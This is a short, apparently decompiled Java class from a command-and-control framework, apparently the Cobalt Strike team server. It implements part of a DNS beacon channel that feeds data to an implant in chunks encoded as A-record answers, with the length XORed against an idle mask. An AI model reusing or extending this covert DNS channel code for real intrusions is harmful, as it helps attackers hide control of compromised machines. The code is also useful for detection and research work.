package beacon.dns;

import common.MudgeSanity;
import dns.DNSServer;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;

public class SendConversationA extends SendConversation {
   protected DataInputStream readme = null;

   public SendConversationA(String var1, String var2, long var3) {
      super(var1, var2, var3);
   }

   public boolean started() {
      return this.readme != null;
   }

   public DNSServer.Response start(byte[] var1) {
      this.readme = new DataInputStream(new ByteArrayInputStream(var1));
      return DNSServer.A((long)var1.length ^ this.idlemask);
   }

   public DNSServer.Response next() {
      try {
         return DNSServer.A((long)this.readme.readInt());
      } catch (IOException var2) {
         MudgeSanity.logException("send, next", var2, false);
         return DNSServer.A(0L);
      }
   }

   public boolean isComplete() {
      try {
         if (this.readme == null) {
            return true;
         } else if (this.readme.available() == 0) {
            this.readme.close();
            return true;
         } else {
            return false;
         }
      } catch (IOException var2) {
         MudgeSanity.logException("isComplete", var2, false);
         return true;
      }
   }
}
